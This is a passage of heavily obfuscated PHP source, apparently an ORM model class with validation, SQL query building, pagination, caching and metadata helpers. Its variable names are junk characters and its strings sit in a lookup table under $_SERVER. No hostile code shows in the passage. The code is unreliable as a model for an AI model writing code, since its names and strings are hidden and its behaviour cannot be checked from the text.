if (is_array($Î½£çğè[0])) { foreach ($Î½£çğè[0] as $ô™ÁÖ‡û) { $àŠ€Ğü[$ô™ÁÖ‡û] = $óìŒ‚’†[$ô™ÁÖ‡û]; } array_unshift($ò¾ğÂã, $àŠ€Ğü); } else { array_unshift($ò¾ğÂã, $óìŒ‚’†[$Î½£çğè[0]]); } if ($õèÕ§ÙÒ[319] == $Î½£çğè[4]) { return call_user_func_array($Î½£çğè[1], $ò¾ğÂã); } else { return call_user_func_array(array(&$this, $Î½£çğè[1]), $ò¾ğÂã); } case $õèÕ§ÙÒ[327]: return $óìŒ‚’†[$Î½£çğè[0]] == $óìŒ‚’†[$Î½£çğè[1]]; case $õèÕ§ÙÒ[328]: if (is_string($Î½£çğè[0]) && strpos($Î½£çğè[0], $õèÕ§ÙÒ[47])) { $Î½£çğè[0] = explode($õèÕ§ÙÒ[47], $Î½£çğè[0]); } $õòè»¨— = array(); if (is_array($Î½£çğè[0])) { foreach ($Î½£çğè[0] as $ô™ÁÖ‡û) { $õòè»¨—[$ô™ÁÖ‡û] = $óìŒ‚’†[$ô™ÁÖ‡û]; } } else { $õòè»¨—[$Î½£çğè[0]] = $óìŒ‚’†[$Î½£çğè[0]]; } if (!empty($óìŒ‚’†[$this->getPk()])) { $õòè»¨—[$this->getPk()] = array($õèÕ§ÙÒ[329], $óìŒ‚’†[$this->getPk()]); } if ($this->where($õòè»¨—)->find()) { return !1; } return !0; default: return $this->check($óìŒ‚’†[$Î½£çğè[0]], $Î½£çğè[1], $Î½£çğè[4]); } } public function check($‰Ğå», $üß”Ù“Â, $ŞƒíË‚› = "\x72\x65\x67\x65\170") { $ÒƒÒÕ»ˆ =& $_SERVER[Ù×¯Ø…]; $ŞƒíË‚› = strtolower(trim($ŞƒíË‚›)); switch ($ŞƒíË‚›) { case $ÒƒÒÕ»ˆ[7]: case $ÒƒÒÕ»ˆ[330]: $íØöÓù˜ = is_array($üß”Ù“Â) ? $üß”Ù“Â : explode($ÒƒÒÕ»ˆ[47], $üß”Ù“Â); return $ŞƒíË‚› == $ÒƒÒÕ»ˆ[7] ? in_array($‰Ğå», $íØöÓù˜) : !in_array($‰Ğå», $íØöÓù˜); case $ÒƒÒÕ»ˆ[331]: case $ÒƒÒÕ»ˆ[332]: if (is_array($üß”Ù“Â)) { $ì­™í¬ = $üß”Ù“Â[0]; $Õó¢å = $üß”Ù“Â[1]; } else { list($ì­™í¬, $Õó¢å) = explode($ÒƒÒÕ»ˆ[47], $üß”Ù“Â); } return $ŞƒíË‚› == $ÒƒÒÕ»ˆ[331] ? $‰Ğå» >= $ì­™í¬ && $‰Ğå» <= $Õó¢å : $‰Ğå» < $ì­™í¬ || $‰Ğå» > $Õó¢å; case $ÒƒÒÕ»ˆ[333]: case $ÒƒÒÕ»ˆ[334]: return $ŞƒíË‚› == $ÒƒÒÕ»ˆ[333] ? $‰Ğå» == $üß”Ù“Â : $‰Ğå» != $üß”Ù“Â; case $ÒƒÒÕ»ˆ[335]: $‘è¥Âù› = mb_strlen($‰Ğå», $ÒƒÒÕ»ˆ[336]); if (strpos($üß”Ù“Â, $ÒƒÒÕ»ˆ[47])) { list($ì­™í¬, $Õó¢å) = explode($ÒƒÒÕ»ˆ[47], $üß”Ù“Â); return $‘è¥Âù› >= $ì­™í¬ && $‘è¥Âù› <= $Õó¢å; } else { return $‘è¥Âù› == $üß”Ù“Â; } case $ÒƒÒÕ»ˆ[337]: list($ìÏîŒ¬Æ, $Õªú…Ğ) = explode($ÒƒÒÕ»ˆ[47], $üß”Ù“Â); if (!is_numeric($ìÏîŒ¬Æ)) { $ìÏîŒ¬Æ = strtotime($ìÏîŒ¬Æ); } if (!is_numeric($Õªú…Ğ)) { $Õªú…Ğ = strtotime($Õªú…Ğ); } return NOW_TIME >= $ìÏîŒ¬Æ && NOW_TIME <= $Õªú…Ğ; case $ÒƒÒÕ»ˆ[338]: return in_array(get_client_ip(), explode($ÒƒÒÕ»ˆ[47], $üß”Ù“Â)); case $ÒƒÒÕ»ˆ[339]: return !in_array(get_client_ip(), explode($ÒƒÒÕ»ˆ[47], $üß”Ù“Â)); case $ÒƒÒÕ»ˆ[326]: default: return $this->regex($‰Ğå», $üß”Ù“Â); } } public function query($°î„×’Ç, $æ‡Æ›©‡ = false) { $ˆ’ ¬ù¤ =& $_SERVER[Ù×¯Ø…]; if (!is_bool($æ‡Æ›©‡) && !is_array($æ‡Æ›©‡)) { $æ‡Æ›©‡ = func_get_args(); array_shift($æ‡Æ›©‡); } $°î„×’Ç = str_replace(array($ˆ’ ¬ù¤[229], $ˆ’ ¬ù¤[340]), $ˆ’ ¬ù¤[50], $°î„×’Ç); $°î„×’Ç = $this->parseSql($°î„×’Ç, $æ‡Æ›©‡); return $this->db->query($°î„×’Ç); } public function execute($Õ¬æõ‹ö, $±Ò«õÑµ = false) { if (!is_bool($±Ò«õÑµ) && !is_array($±Ò«õÑµ)) { $±Ò«õÑµ = func_get_args(); array_shift($±Ò«õÑµ); } $Õ¬æõ‹ö = $this->parseSql($Õ¬æõ‹ö, $±Ò«õÑµ); return $this->db->execute($Õ¬æõ‹ö); } protected function parseSql($ºĞı…„, $üÈ¥ôĞØ) { $Íşğí¹¡ =& $_SERVER[Ù×¯Ø…]; if (!0 === $üÈ¥ôĞØ) { $¨ÅÄÒŠ¸ = $this->_parseOptions(); $ºĞı…„ = $this->db->parseSql($ºĞı…„, $¨ÅÄÒŠ¸); } elseif (is_array($üÈ¥ôĞØ)) { $üÈ¥ôĞØ = array_map(array($this->db, $Íşğí¹¡[341]), $üÈ¥ôĞØ); $ºĞı…„ = vsprintf($ºĞı…„, $üÈ¥ôĞØ); } else { $ºĞı…„ = strtr($ºĞı…„, array($Íşğí¹¡[342] => $this->getTableName(), $Íşğí¹¡[343] => think_config($Íşğí¹¡[242]))); } $this->db->setModel($this->name); return $ºĞı…„; } public function db($™ÂùóÜé = '', $î¨„è¢¢ = '', $âË¸Óñ = array()) { $ŠúÑÙ˜â =& $_SERVER[Ù×¯Ø…]; if ($ŠúÑÙ˜â[33] === $™ÂùóÜé && $this->db) { return $this->db; } static $—–±È‘  = array(); static $æùêµ‚± = array(); if (!isset($æùêµ‚±[$™ÂùóÜé]) || isset($æùêµ‚±[$™ÂùóÜé]) && $î¨„è¢¢ && $—–±È‘ [$™ÂùóÜé] != $î¨„è¢¢) { if (!empty($î¨„è¢¢) && is_string($î¨„è¢¢) && !1 === strpos($î¨„è¢¢, $ŠúÑÙ˜â[8])) { $î¨„è¢¢ = think_config($î¨„è¢¢); } $™ÂùóÜé = think_guid($î¨„è¢¢); $æùêµ‚±[$™ÂùóÜé] = Db::getInstance($î¨„è¢¢); } elseif (NULL === $î¨„è¢¢) { $æùêµ‚±[$™ÂùóÜé]->close(); unset($æùêµ‚±[$™ÂùóÜé]); return; } if (!empty($âË¸Óñ)) { if (is_string($âË¸Óñ)) { parse_str($âË¸Óñ, $âË¸Óñ); } foreach ($âË¸Óñ as $ÁÚÅß§ => $†Š¦ş¯Ã) { $this->setProperty($ÁÚÅß§, $†Š¦ş¯Ã); } } $—–±È‘ [$™ÂùóÜé] = $î¨„è¢¢; $this->db = $æùêµ‚±[$™ÂùóÜé]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Úâ£ùŞ› = get_class($this); if ($Úâ£ùŞ› == $_SERVER[Ù×¯Ø…][344]) { return $this->name; } $this->name = substr($Úâ£ùŞ›, 0, -5); } return $this->name; } public function getTableName() { $Ğ¢—ß” =& $_SERVER[Ù×¯Ø…]; if (empty($this->trueTableName)) { $úğûöâ¯ = !empty($this->tablePrefix) ? $this->tablePrefix : $Ğ¢—ß”[33]; if (!empty($this->tableName)) { $úğûöâ¯ .= $this->tableName; } else { $úğûöâ¯ .= think_parse_name($this->name); } $this->trueTableName = strtolower($úğûöâ¯); } return (!empty($this->dbName) ? $this->dbName . $Ğ¢—ß”[95] : $Ğ¢—ß”[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ßâ³ªŸŞ =& $_SERVER[Ù×¯Ø…]; return isset($this->fields[$ßâ³ªŸŞ[249]]) ? $this->fields[$ßâ³ªŸŞ[249]] : $this->pk; } public function getDbFields() { $ÏŒñÌ®ô =& $_SERVER[Ù×¯Ø…]; if (isset($this->options[$ÏŒñÌ®ô[277]])) { $–‡’²Çç = $this->db->getFields($this->options[$ÏŒñÌ®ô[277]]); return $–‡’²Çç ? array_keys($–‡’²Çç) : !1; } if ($this->fields) { $–‡’²Çç = $this->fields; unset($–‡’²Çç[$ÏŒñÌ®ô[248]], $–‡’²Çç[$ÏŒñÌ®ô[249]], $–‡’²Çç[$ÏŒñÌ®ô[250]], $–‡’²Çç[$ÏŒñÌ®ô[247]]); return $–‡’²Çç; } return !1; } public function data($™½®Ö£­ = '') { $ˆıÀÛ¸ =& $_SERVER[Ù×¯Ø…]; if ($ˆıÀÛ¸[33] === $™½®Ö£­ && !empty($this->data)) { return $this->data; } if (is_object($™½®Ö£­)) { $™½®Ö£­ = get_object_vars($™½®Ö£­); } elseif (is_string($™½®Ö£­)) { parse_str($™½®Ö£­, $™½®Ö£­); } elseif (!is_array($™½®Ö£­)) { think_exception(think_lang($ˆıÀÛ¸[269])); } $this->data = $™½®Ö£­; return $this; } public function join($¾Ô±¬Œ) { $ºÕ´‘‘ =& $_SERVER[Ù×¯Ø…]; if (is_array($¾Ô±¬Œ)) { $this->options[$ºÕ´‘‘[280]] = $¾Ô±¬Œ; } elseif (!empty($¾Ô±¬Œ)) { $this->options[$ºÕ´‘‘[280]][] = $¾Ô±¬Œ; } return $this; } public function union($Û™ä ò», $–É’»ãÂ = false) { $ºÁ»ªèÛ =& $_SERVER[Ù×¯Ø…]; if (empty($Û™ä ò»)) { return $this; } if ($–É’»ãÂ) { $this->options[$ºÁ»ªèÛ[345]][$ºÁ»ªèÛ[346]] = !0; } if (is_object($Û™ä ò»)) { $Û™ä ò» = get_object_vars($Û™ä ò»); } if (is_string($Û™ä ò»)) { $Üâ‰ş—ç = $Û™ä ò»; } elseif (is_array($Û™ä ò»)) { if (isset($Û™ä ò»[0])) { $this->options[$ºÁ»ªèÛ[345]] = array_merge($this->options[$ºÁ»ªèÛ[345]], $Û™ä ò»); return $this; } else { $Üâ‰ş—ç = $Û™ä ò»; } } else { think_exception(think_lang($ºÁ»ªèÛ[269])); } $this->options[$ºÁ»ªèÛ[345]][] = $Üâ‰ş—ç; return $this; } public function cache($¹Ô™¨ = true, $ê—Ù‰•ü = null, $†§ÏìÀ = '') { $Åè¡ìÜ =& $_SERVER[Ù×¯Ø…]; if (!1 !== $¹Ô™¨) { $this->options[$Åè¡ìÜ[347]] = array($Åè¡ìÜ[93] => $¹Ô™¨, $Åè¡ìÜ[337] => $ê—Ù‰•ü, $Åè¡ìÜ[29] => $†§ÏìÀ); } return $this; } public function field($îËÜ÷‡µ, $½™Ğ‘Š‚ = false) { $ıßš îÊ =& $_SERVER[Ù×¯Ø…]; if (!0 === $îËÜ÷‡µ) { $äµ„®µ• = $this->getDbFields(); $îËÜ÷‡µ = $äµ„®µ• ? $äµ„®µ• : $ıßš îÊ[182]; } elseif ($½™Ğ‘Š‚) { if (is_string($îËÜ÷‡µ)) { $îËÜ÷‡µ = explode($ıßš îÊ[47], $îËÜ÷‡µ); } $äµ„®µ• = $this->getDbFields(); $îËÜ÷‡µ = $äµ„®µ• ? array_diff($äµ„®µ•, $îËÜ÷‡µ) : $îËÜ÷‡µ; } $this->options[$ıßš îÊ[271]] = $îËÜ÷‡µ; return $this; } public function scope($ŞŞ¿í±‚ = '', $õ®šË…İ = NULL) { $š¤í÷ =& $_SERVER[Ù×¯Ø…]; if ($š¤í÷[33] === $ŞŞ¿í±‚) { if (isset($this->_scope[$š¤í÷[34]])) { $ßå¯±æ = $this->_scope[$š¤í÷[34]]; } else { return $this; } } elseif (is_string($ŞŞ¿í±‚)) { $“ËÏØˆÕ = explode($š¤í÷[47], $ŞŞ¿í±‚); $ßå¯±æ = array(); foreach ($“ËÏØˆÕ as $‹øšÜàœ) { if (!isset($this->_scope[$‹øšÜàœ])) { continue; } $ßå¯±æ = array_merge($ßå¯±æ, $this->_scope[$‹øšÜàœ]); } if (!empty($õ®šË…İ) && is_array($õ®šË…İ)) { $ßå¯±æ = array_merge($ßå¯±æ, $õ®šË…İ); } } elseif (is_array($ŞŞ¿í±‚)) { $ßå¯±æ = $ŞŞ¿í±‚; } if (is_array($ßå¯±æ) && !empty($ßå¯±æ)) { $this->options = array_merge($this->options, array_change_key_case($ßå¯±æ)); } return $this; } public function where($ğÄ‰í“‹, $‰ıÀõ = null) { $Êµ¡óÔê =& $_SERVER[Ù×¯Ø…]; if (!is_null($‰ıÀõ) && is_string($ğÄ‰í“‹)) { if (!is_array($‰ıÀõ)) { $‰ıÀõ = func_get_args(); array_shift($‰ıÀõ); } $‰ıÀõ = array_map(array($this->db, $Êµ¡óÔê[341]), $‰ıÀõ); $ğÄ‰í“‹ = vsprintf($ğÄ‰í“‹, $‰ıÀõ); } elseif (is_object($ğÄ‰í“‹)) { $ğÄ‰í“‹ = get_object_vars($ğÄ‰í“‹); } elseif (is_array($ğÄ‰í“‹)) { foreach ($ğÄ‰í“‹ as $¶°‚ş “ => $·²æ”èê) { if ((is_numeric($¶°‚ş “) || !$¶°‚ş “) && is_string($·²æ”èê)) { if (strpos($·²æ”èê, $Êµ¡óÔê[348]) === 0) { continue; } think_trace($Êµ¡óÔê[349], $Êµ¡óÔê[33], $Êµ¡óÔê[46]); die; } } } if (is_string($ğÄ‰í“‹) && $Êµ¡óÔê[33] != $ğÄ‰í“‹) { $ş‰øáš€ = array(); $ş‰øáš€[$Êµ¡óÔê[350]] = $ğÄ‰í“‹; $ğÄ‰í“‹ = $ş‰øáš€; } if (isset($this->options[$Êµ¡óÔê[273]])) { $this->options[$Êµ¡óÔê[273]] = array_merge($this->options[$Êµ¡óÔê[273]], $ğÄ‰í“‹); } else { $this->options[$Êµ¡óÔê[273]] = $ğÄ‰í“‹; } return $this; } public function limit($ÓÓÒë¼, $¾üŸ‹ú = null) { $–´æß›Ï =& $_SERVER[Ù×¯Ø…]; $this->options[$–´æß›Ï[290]] = is_null($¾üŸ‹ú) ? $ÓÓÒë¼ : $ÓÓÒë¼ . $–´æß›Ï[47] . $¾üŸ‹ú; return $this; } public function page($Ëº­¬ıØ, $€Èòç«‰ = null) { $—»ÜÑÁ³ =& $_SERVER[Ù×¯Ø…]; $this->options[$—»ÜÑÁ³[351]] = is_null($€Èòç«‰) ? $Ëº­¬ıØ : $Ëº­¬ıØ . $—»ÜÑÁ³[47] . $€Èòç«‰; return $this; } public function comment($—•Àƒòš) { $this->options[$_SERVER[Ù×¯Ø…][352]] = $—•Àƒòš; return $this; } public function setProperty($÷ŞÏªİ, $õ¦£ùŸù) { if (property_exists($this, $÷ŞÏªİ)) { $this->{$÷ŞÏªİ} = $õ¦£ùŸù; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\151\x66\171\124\151\155\145", "\x74\151\155\145", "\151\156\x73\145\162\164\54\165\160\144\x61\164\145", "\x66\165\x6e\x63\x74\151\157\x6e"), array("\143\162\x65\141\x74\145\124\x69\155\145", "\164\151\155\145", "\x69\x6e\x73\145\x72\164", "\146\x75\x6e\143\x74\151\157\156")); public function setDataAuto($§ó‘ïĞ²) { $this->dataAuto = $§ó‘ïĞ²; } public function __construct($¬¯û•Ã = '', $âˆì†Ğ‘ = '', $ûø¶Ö¼Œ = '') { parent::__construct($¬¯û•Ã, $âˆì†Ğ‘, $ûø¶Ö¼Œ); } protected $tableMeta = array(); protected function _beforeInsert(&$¿ÔŠÊš…, $´‰†¥áÆ) { $»ˆµñ›Ú =& $_SERVER[Ù×¯Ø…]; if (!$this->checkDataAutoHas($»ˆµñ›Ú[353])) { return; } $this->dataBeforeFilter($¿ÔŠÊš…, $»ˆµñ›Ú[353]); } protected function _beforeUpdate(&$…°óôú´, $º±·€Ğ‰) { $€Öé…Ñ¿ =& $_SERVER[Ù×¯Ø…]; if (!$this->checkDataAutoHas($€Öé…Ñ¿[354])) { return; } $this->dataBeforeFilter($…°óôú´, $€Öé…Ñ¿[354]); } protected function _afterSelect(&$ğîÃê·¡, $¯æÀô) { if (!is_array($ğîÃê·¡)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ù×¯Ø…][355])) { return; } foreach ($ğîÃê·¡ as &$¥ï‡Ö‰ù) { $this->dataAfterFilter($¥ï‡Ö‰ù); } unset($¥ï‡Ö‰ù); } protected function _afterFind(&$Œ£Á€ˆæ, $ÏÔÅáœ) { if (!is_array($Œ£Á€ˆæ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ù×¯Ø…][355])) { return; } $this->dataAfterFilter($Œ£Á€ˆæ); } public static function textEncode($À½ß‰Ç) { if (!$À½ß‰Ç) { return $À½ß‰Ç; } $›ªÏñÏÜ = json_encode($À½ß‰Ç); $›ªÏñÏÜ = preg_replace_callback($_SERVER[Ù×¯Ø…][356], function ($ÉÏ…±î) { return addslashes($ÉÏ…±î[0]); }, $›ªÏñÏÜ); return json_decode($›ªÏñÏÜ); } public static function textDecode($ıƒõ«á) { $£¹­“¼ =& $_SERVER[Ù×¯Ø…]; $µ‰®ã¥Ñ = json_encode($ıƒõ«á); $µ‰®ã¥Ñ = preg_replace_callback($£¹­“¼[357], function ($„øº¨ Ü) { return $_SERVER[Ù×¯Ø…][97]; }, $µ‰®ã¥Ñ); return json_decode($µ‰®ã¥Ñ); } public function setAutoIncrement($ÀÏ‘’„‚) { $‹¬¤Á‡¸ = array($this->getPk() => $ÀÏ‘’„‚); $Ôã€ò·ó = $this->data($‹¬¤Á‡¸)->add(); if ($Ôã€ò·ó) { $this->delete($Ôã€ò·ó); } } public function getAutoIncrement() { $‘ìƒú­´ = $this->getTableName(); $Ë±ÚÙ¶ = $this->max($this->getPk()); $€ÈÉ¤ı = $this->query("\163\x68\x6f\167\x20\x74\x61\x62\x6c\145\x20\163\x74\x61\164\x75\x73\40\x77\150\145\x72\x65\x20\x4e\x61\155\x65\x3d\x27{$‘ìƒú­´}\47"); $ú»˜—ÈÂ = $€ÈÉ¤ı[0][$_SERVER[Ù×¯Ø…][358]]; $×Ğ¨¼ = max($Ë±ÚÙ¶, $ú»˜—ÈÂ); return $×Ğ¨¼; } protected function _callBefore($»­ÇéÜô, $§Ü›ÂÅ¶) { return $this->cacheCallCheck($»­ÇéÜô, $§Ü›ÂÅ¶, !1); } protected function _callAfter($Ã¤çéœì, $¸‡¸ä—›) { return $this->cacheCallCheck($Ã¤çéœì, $¸‡¸ä—›, !0); } protected function cacheFunctionAlias($Ûõß¸òˆ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ùÛØµ˜ù, $ÆîêÀ’, $ôöîş•´ = false) { $£â¹êÉ = $this->cacheFunctionAlias($ÆîêÀ’); if (!$£â¹êÉ) { return; } foreach ($£â¹êÉ as $Ô¿Ô™üá => $ûÃç²»È) { $‰Ì¸ãáÃ = $ûÃç²»È[0]; $÷…ŒÊßî = explode($_SERVER[Ù×¯Ø…][47], $ûÃç²»È[1]); if ($ùÛØµ˜ù == $Ô¿Ô™üá) { return $this->cacheFunctionGet($Ô¿Ô™üá, $‰Ì¸ãáÃ); } if ($ôöîş•´ && in_array($ùÛØµ˜ù, $÷…ŒÊßî)) { $this->cacheFunctionClear($Ô¿Ô™üá, $‰Ì¸ãáÃ); } } } public function cacheFunctionGet($ìö«÷†, $ö îÔˆ) { $²ò†ß÷ = $this->cacheKeyMake($ìö«÷†, $ö îÔˆ); $ëØ‡è„â = Cache::get($²ò†ß÷); if (!is_array($ëØ‡è„â)) { $ëØ‡è„â = call_user_func_array(array($this, $ìö«÷†), array($ö îÔˆ, !0)); Cache::set($²ò†ß÷, $ëØ‡è„â); } return $ëØ‡è„â; } public function cacheFunctionClear($ñÔæ•®¾, $¿üÎ€Ô¨) { $¦å½•ë¿ = $¿üÎ€Ô¨; if (!is_array($¿üÎ€Ô¨)) { $¦å½•ë¿ = array($¿üÎ€Ô¨); } foreach ($¦å½•ë¿ as $’¾„Óá¾) { $½ôÇ¹¿„ = $this->cacheKeyMake($ñÔæ•®¾, $’¾„Óá¾); Cache::remove($½ôÇ¹¿„); } } private function cacheKeyMake($Àìöí, $·„Ö«øî) { $¾ëä‚ı¤ =& $_SERVER[Ù×¯Ø…]; return get_class($this) . $¾ëä‚ı¤[71] . $Àìöí . $¾ëä‚ı¤[359] . $·„Ö«øî; } protected function selectPageReset() { $©œ’¯ÂÇ =& $_SERVER[Ù×¯Ø…]; if (isset($GLOBALS[$©œ’¯ÂÇ[360]])) { return; } $GLOBALS[$©œ’¯ÂÇ[360]] = isset($GLOBALS[$©œ’¯ÂÇ[7]][$©œ’¯ÂÇ[361]]) ? $GLOBALS[$©œ’¯ÂÇ[7]][$©œ’¯ÂÇ[361]] : !1; $GLOBALS[$©œ’¯ÂÇ[362]] = isset($GLOBALS[$©œ’¯ÂÇ[7]][$©œ’¯ÂÇ[351]]) ? $GLOBALS[$©œ’¯ÂÇ[7]][$©œ’¯ÂÇ[351]] : !1; $GLOBALS[$©œ’¯ÂÇ[7]][$©œ’¯ÂÇ[361]] = !1; $GLOBALS[$©œ’¯ÂÇ[7]][$©œ’¯ÂÇ[351]] = !1; } protected function selectPageRestore() { $Ë÷Ç×å† =& $_SERVER[Ù×¯Ø…]; if (!isset($GLOBALS[$Ë÷Ç×å†[360]])) { return; } $GLOBALS[$Ë÷Ç×å†[7]][$Ë÷Ç×å†[361]] = $GLOBALS[$Ë÷Ç×å†[360]]; $GLOBALS[$Ë÷Ç×å†[7]][$Ë÷Ç×å†[351]] = $GLOBALS[$Ë÷Ç×å†[362]]; if ($GLOBALS[$Ë÷Ç×å†[7]][$Ë÷Ç×å†[361]] === !1) { unset($GLOBALS[$Ë÷Ç×å†[7]][$Ë÷Ç×å†[361]]); } if ($GLOBALS[$Ë÷Ç×å†[7]][$Ë÷Ç×å†[351]] === !1) { unset($GLOBALS[$Ë÷Ç×å†[7]][$Ë÷Ç×å†[351]]); } unset($GLOBALS[$Ë÷Ç×å†[360]]); unset($GLOBALS[$Ë÷Ç×å†[362]]); } protected function selectPage($ŒÑÇˆÙÃ = 200, $Î‹Åòò³ = 1) { $·æ ãÏµ =& $_SERVER[Ù×¯Ø…]; global $in; $Î Ïã¦­ = $this->optionsValue(); $·Š÷ˆÄ³ = 50000; $ŒÑÇˆÙÃ = isset($in[$·æ ãÏµ[361]]) && $in[$·æ ãÏµ[361]] ? $in[$·æ ãÏµ[361]] : $ŒÑÇˆÙÃ; if ($ŒÑÇˆÙÃ === -1) { $in[$·æ ãÏµ[361]] = !1; $·Š÷ˆÄ³ = 100000000; $ŒÑÇˆÙÃ = $·Š÷ˆÄ³; } $œŠ¨¨×ú = $Î Ïã¦­; $œŠ¨¨×ú[$·æ ãÏµ[363]] = array(); $ŒÑÇˆÙÃ = intval($ŒÑÇˆÙÃ); $ŒÑÇˆÙÃ = $ŒÑÇˆÙÃ <= 5 ? 5 : ($ŒÑÇˆÙÃ >= $·Š÷ˆÄ³ ? $·Š÷ˆÄ³ : $ŒÑÇˆÙÃ); $Î‹Åòò³ = intval(isset($in[$·æ ãÏµ[351]]) && $in[$·æ ãÏµ[351]] ? $in[$·æ ãÏµ[351]] : $Î‹Åòò³); $Î‹Åòò³ = $Î‹Åòò³ <= 1 ? 1 : $Î‹Åòò³; $×°Ùó«Ğ = array(); $¤‰âÇ = 1; if ($Î‹Åòò³ == 1 && $¤‰âÇ) { $this->optionsValue($Î Ïã¦­); $×°Ùó«Ğ = $this->page($Î‹Åòò³, $ŒÑÇˆÙÃ)->select(); $ñØ±×è = is_array($×°Ùó«Ğ) ? count($×°Ùó«Ğ) : 0; if ($ñØ±×è < $ŒÑÇˆÙÃ) { $¯‘ãÍ³¥ = 1; } else { $this->optionsValue($œŠ¨¨×ú); $ñØ±×è = intval($this->count()); $¯‘ãÍ³¥ = ceil($ñØ±×è / $ŒÑÇˆÙÃ); } } else { $this->optionsValue($œŠ¨¨×ú); $ñØ±×è = intval($this->count()); $¯‘ãÍ³¥ = ceil($ñØ±×è / $ŒÑÇˆÙÃ); $Î‹Åòò³ = $Î‹Åòò³ >= $¯‘ãÍ³¥ ? $¯‘ãÍ³¥ : $Î‹Åòò³; $this->optionsValue($Î Ïã¦­); $×°Ùó«Ğ = $this->page($Î‹Åòò³, $ŒÑÇˆÙÃ)->select(); } if (!is_array($×°Ùó«Ğ)) { $×°Ùó«Ğ = array(); } if ($¯‘ãÍ³¥ == 1) { $ñØ±×è = count($×°Ùó«Ğ); } $êşˆ‚àá = array($·æ ãÏµ[364] => array($·æ ãÏµ[365] => $ñØ±×è, $·æ ãÏµ[361] => $ŒÑÇˆÙÃ, $·æ ãÏµ[351] => $Î‹Åòò³, $·æ ãÏµ[366] => $¯‘ãÍ³¥), $·æ ãÏµ[367] => $×°Ùó«Ğ); return $êşˆ‚àá; } protected function checkLength($³Úß´Ó, $öçà–É = 0, $ãëà×èÂ = '') { $Çæƒş­À =& $_SERVER[Ù×¯Ø…]; $öçà–É = $öçà–É ? $öçà–É : 65536; if (!$³Úß´Ó || strlen($³Úß´Ó) < $öçà–É) { return; } $ãëà×èÂ = $ãëà×èÂ ? $ãëà×èÂ . $Çæƒş­À[68] : $Çæƒş­À[33]; show_json($ãëà×èÂ . LNG($Çæƒş­À[368]) . "\x28{$öçà–É}\51", !1); } protected function metaSet($ûÀÇ±, $ÚìçÂ†¤ = null, $çéé„ŠÈ = null) { $¡” ì„Ã =& $_SERVER[Ù×¯Ø…]; if (!$this->tableMeta || !$ûÀÇ±) { return !1; } $³âíæşü = $this->tableMeta[$¡” ì„Ã[369]]; $¢‹ÇÀŒæ = $this->tableMeta[$¡” ì„Ã[370]]; $ê±¢ÁÏ¸ = Model($¢‹ÇÀŒæ); $‘õ¹ŒÙë = array($³âíæşü => $ûÀÇ±, $¡” ì„Ã[371] => $ÚìçÂ†¤); if (is_null($ÚìçÂ†¤)) { return $ê±¢ÁÏ¸->where(array($³âíæşü => $ûÀÇ±))->delete(); } if (is_null($çéé„ŠÈ) && is_string($ÚìçÂ†¤)) { return $ê±¢ÁÏ¸->where($‘õ¹ŒÙë)->delete(); } $Ë€«ªòÉ = is_array($ÚìçÂ†¤) ? $ÚìçÂ†¤ : array(); if (is_string($ÚìçÂ†¤)) { $Ë€«ªòÉ[$ÚìçÂ†¤] = $çéé„ŠÈ; } $ûàåò” = array(); foreach ($Ë€«ªòÉ as $Ë³‚¿Ó => $ûî…®şñ) { if (is_null($ûî…®şñ) && is_string($Ë³‚¿Ó)) { $ê±¢ÁÏ¸->where(array($³âíæşü => $ûÀÇ±, $¡” ì„Ã[371] => $Ë³‚¿Ó))->delete(); continue; } $this->checkLength($ûî…®şñ, !1, $¢‹ÇÀŒæ . $¡” ì„Ã[4] . $Ë³‚¿Ó); $ûàåò”[] = array($³âíæşü => $ûÀÇ±, $¡” ì„Ã[93] => $Ë³‚¿Ó, $¡” ì„Ã[372] => $ûî…®şñ); } $¡ü¼–»‚ = $¡” ì„Ã[373] . $¢‹ÇÀŒæ; CacheLock::lock($¡ü¼–»‚); $ê±¢ÁÏ¸->where(array($³âíæşü => $ûÀÇ±))->addAll($ûàåò”, array(), !0); CacheLock::unlock($¡ü¼–»‚); return !0; } public function metaGet($°ŠË¶¤, $–ÍºÉä© = false) { $Îãêâá¶ =& $_SERVER[Ù×¯Ø…]; if (!$this->tableMeta) { return array(); } $äşË³¡ğ = $this->tableMeta[$Îãêâá¶[369]]; $ÑÁÇ Œˆ = Model($this->tableMeta[$Îãêâá¶[370]]); if ($–ÍºÉä©) { $ïÍİâÂ» = array($äşË³¡ğ => $°ŠË¶¤, $Îãêâá¶[93] => $–ÍºÉä©); return $ÑÁÇ Œˆ->where($ïÍİâÂ»)->getField($Îãêâá¶[372]); } $ïÍİâÂ» = array($äşË³¡ğ => $°ŠË¶¤); $õ¥ƒÌÇ = $ÑÁÇ Œˆ->field($Îãêâá¶[374])->where($ïÍİâÂ»)->select(); $õ¥ƒÌÇ = array_to_keyvalue($õ¥ƒÌÇ, $Îãêâá¶[93], $Îãêâá¶[372]); return $õ¥ƒÌÇ; } private function checkDataAutoHas($ÊğÚ“Ò) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $œ˜şúä³) { if (in_array($ÊğÚ“Ò, explode($_SERVER[Ù×¯Ø…][47], $œ˜şúä³[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ªû§Ïó•, $—ÅìŠ½€) { $§´ªúÍß =& $_SERVER[Ù×¯Ø…]; foreach ($this->dataAuto as $³’¨‹Áô) { $îŸÊÓ = $³’¨‹Áô[0]; if (!in_array($—ÅìŠ½€, explode($§´ªúÍß[47], $³’¨‹Áô[2]))) { continue; } switch (trim($³’¨‹Áô[3])) { case $§´ªúÍß[319]: case $§´ªúÍß[320]: $òéÁŞ³Ç = $³’¨‹Áô[1]; $í´íÑá = isset($³’¨‹Áô[4]) ? (array) $³’¨‹Áô[4] : array(); if ($òéÁŞ³Ç == $§´ªúÍß[197] && array_key_exists($îŸÊÓ, 